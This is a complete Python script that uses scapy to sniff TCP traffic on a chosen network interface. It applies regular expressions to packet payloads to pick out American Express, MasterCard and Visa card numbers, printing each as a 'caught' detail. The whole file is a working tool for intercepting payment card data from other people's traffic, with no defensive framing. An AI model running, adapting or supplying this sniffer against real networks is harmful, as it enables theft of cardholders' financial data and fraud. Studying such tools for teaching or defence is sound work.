import re 
import optparse
from scapy.all import *

def credDetails(pkt):
	raw = pkt.sprintf('%Raw.load%')
	amerExp = re.findall('3[47][0-9]{13}', raw)
	masterCard = re.findall('5[1-5][0-9]{14}', raw)
	visaRe = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

	if amerExp:
		print '[+]Caught American Express Details' + amerExp[0]
	if masterCard:
		print '[+]Caught Master Card Details'+ masterCard[0]
	if visaRe:
		print '[+]Caught Visa Details' + visaRe[0]


def main():

	parser = optparse.OptionParser('usage % prog -i<interface>')
	parser.add_option('-i', dest='interface', type='string', help='specify the interface')
	(options, args) = parser.parse_args()

	if options.interface == None:
		print parser.usage
		exit(0)
	else:
		conf.interface = options.interface
	try:
		print '[*] Sniffer is starting'
		sniff(filter='tcp', prn=credDetails, store=0)
	except KeyboardInterrupt:
		exit(0)

if __name__ == '__main__':
	main()